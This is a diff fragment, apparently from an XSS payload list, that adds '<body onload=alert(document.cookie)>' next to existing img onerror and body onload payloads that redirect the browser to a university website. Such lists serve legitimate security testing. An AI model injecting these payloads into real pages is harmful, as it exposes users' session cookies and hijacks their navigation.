@@ -2,6 +2,8 @@
 
 <img src=sd onerror=alert(window.location.assign("http://www.ufrpe.br/"))>
 
+<body onload=alert(document.cookie)>
+
 <body onload=alert(window.location.assign("http://www.ufrpe.br/"))>
 
 <body onload=console.log(window.location.assign("http://www.ufrpe.br/"))>
